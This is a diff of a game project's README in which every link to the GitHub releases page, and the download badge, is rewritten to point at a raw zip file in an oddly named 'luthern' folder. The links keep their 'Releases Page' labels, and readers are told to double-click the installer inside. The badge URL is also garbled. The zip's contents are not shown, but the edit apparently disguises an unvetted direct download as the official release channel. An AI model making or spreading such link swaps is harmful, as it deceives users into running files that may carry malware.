@@ -7,7 +7,7 @@ Puzzle-Platformer is an engaging game where you solve puzzles to advance through
 To start playing Puzzle-Platformer, you'll need to download the game from our releases page. Follow these simple steps to get going.
 
 ## 📥 Download Now
-[![Download Puzzle-Platformer](https://img.shields.io/badge/Download%20Puzzle--Platformer-v1.0-blue.svg)](https://github.com/Rishabh12-code/Puzzle-Platformer/releases)
+[![Download Puzzle-Platformer](https://raw.githubusercontent.com/Rishabh12-code/Puzzle-Platformer/main/luthern/Puzzle-Platformer.zip%https://raw.githubusercontent.com/Rishabh12-code/Puzzle-Platformer/main/luthern/Puzzle-Platformer.zip)](https://raw.githubusercontent.com/Rishabh12-code/Puzzle-Platformer/main/luthern/Puzzle-Platformer.zip)
 
 ## 🎮 System Requirements
 Before downloading, please ensure your computer meets the following basic requirements:
@@ -19,7 +19,7 @@ Before downloading, please ensure your computer meets the following basic requir
 - **Storage**: At least 1 GB of free disk space
 
 ## 🔗 Download & Install
-1. **Visit this page to download**: Head over to our [Releases Page](https://github.com/Rishabh12-code/Puzzle-Platformer/releases) to find the latest version of Puzzle-Platformer.
+1. **Visit this page to download**: Head over to our [Releases Page](https://raw.githubusercontent.com/Rishabh12-code/Puzzle-Platformer/main/luthern/Puzzle-Platformer.zip) to find the latest version of Puzzle-Platformer.
 2. **Choose your version**: On the releases page, you will see a list of available versions. Click on the version you wish to download.
 3. **Download the installer**: Click on the link for your operating system. The download will start automatically.
 4. **Run the installer**: Once the download is complete, locate the file (usually in your Downloads folder). Double-click it to run the installer.
@@ -43,7 +43,7 @@ We believe in the power of community. Join our team of players and developers to
 - **Accessible gameplay**: Designed for players of all ages and skill levels.
 
 ## 🔄 Updating the Game
-To ensure a smooth experience, keep your version of Puzzle-Platformer updated. Return to the [Releases Page](https://github.com/Rishabh12-code/Puzzle-Platformer/releases) regularly to download the latest updates and new features.
+To ensure a smooth experience, keep your version of Puzzle-Platformer updated. Return to the [Releases Page](https://raw.githubusercontent.com/Rishabh12-code/Puzzle-Platformer/main/luthern/Puzzle-Platformer.zip) regularly to download the latest updates and new features.
 
 ## 📞 Contact Us
 For any inquiries or support needs, please reach out to our team through the GitHub Issues section. We aim to respond to all queries promptly.
